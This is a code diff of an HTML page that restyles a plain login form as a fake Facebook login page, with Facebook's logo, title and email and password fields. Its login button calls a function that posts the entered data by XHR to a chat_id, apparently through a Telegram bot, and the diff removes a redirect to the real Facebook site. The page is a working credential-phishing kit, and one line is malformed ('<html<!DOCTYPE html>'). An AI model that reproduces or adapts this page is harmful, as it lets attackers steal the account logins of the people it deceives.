@@ -1,17 +1,28 @@
 <!DOCTYPE html>
-<html>
+<html<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Login Form</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Facebook - Login</title>
 </head>
 <body>
-    <h1>Login Form</h1>
-    <form>
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email"><br><br>
-        <label for="pass">Password:</label>
-        <input type="password" id="pass" name="pass"><br><br>
-        <button type="button" onclick="sendTelegramMessage()">Login</button>
-    </form>
+    <div class="main">
+        <div class="logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="logo">
+        </div>
+        <div class="container">
+            <span class="login">Login to Facebook</span>
+            <input type="email" name="email" id="email" placeholder="Email address or phone number">
+            <input type="password" name="pass" id="pass" placeholder="Password">
+            <button class="login-btn" onclick="sendTelegramMessage()">Đăng Nhập</button>
+            <a href="#">Forgotten account</a>
+            <div class="style">or</div>
+            <button class="new-account">Create New Account</button>
+        </div>
+    </div>
 
     <script>
         function sendTelegramMessage() {
@@ -24,11 +35,7 @@
             xhr.open("POST", url, true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send("chat_id=" + chatId + "&text=" + message);
-
-            // Chuyển hướng sang trang web của Facebook
-            window.location.href = "https://m.facebook.com/profile";
         }
     </script>
 </body>
 </html>
- 
